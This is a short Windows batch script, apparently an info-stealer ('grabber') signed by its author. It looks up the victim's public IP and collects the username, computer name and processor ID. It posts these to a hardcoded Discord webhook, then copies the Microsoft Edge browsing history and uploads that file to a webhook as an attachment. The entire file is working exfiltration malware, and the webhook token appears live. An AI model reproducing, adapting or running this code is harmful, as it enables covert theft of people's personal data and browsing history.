@echo off






curl -4 icanhazip.com 1> tmpwanip & cls & set /p ipv4= < tmpwanip & set /p ipv4= < tmpwanip & del /f tmpwanip

set "message_text=**:crown: %username% was grabbed :crown:** \n\n :person_pouting: **Username : %username%** \n :detective:** IP : %ipv4%** \n :information_source:** LAPTOP ? : %computername%** \n :minidisc: **PROCESSOR : %PROCESSOR_IDENTIFIER%** \n :timer:** Date : %date% at %time%** \n\n :moyai:**__Created by Anonym0usse__ **\n **:floppy_disk: GITHUB : https://github.com/Anonym0usse** \n\n :newspaper: ** Historic :**\n "




curl -k -F "payload_json={\"content\": \"%message_text%\"}" https://discord.com/api/webhooks/1026225727105945665/wBcykJZZ9qMt3QiFmp1JZItKcNzw1kxUCJfaVgWhxFR3z7Twp-CvoX8KhZGMCfoz9aWI



mkdir Engineering

xcopy "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Default\History" "C:\Users\%username%\OneDrive\Bureau\Engineering"
cd "C:\Users\%username%\OneDrive\Bureau\Engineering"
rename "History" "Historique.txt"




set "attachment=C:\Users\%username%\OneDrive\Bureau\Engineering\Historique.txt"
curl -k -F "payload_json={\"content\": \"%message_text%\"}"  -F "file1=@%attachment%" https://discord.com/api/webhooks/
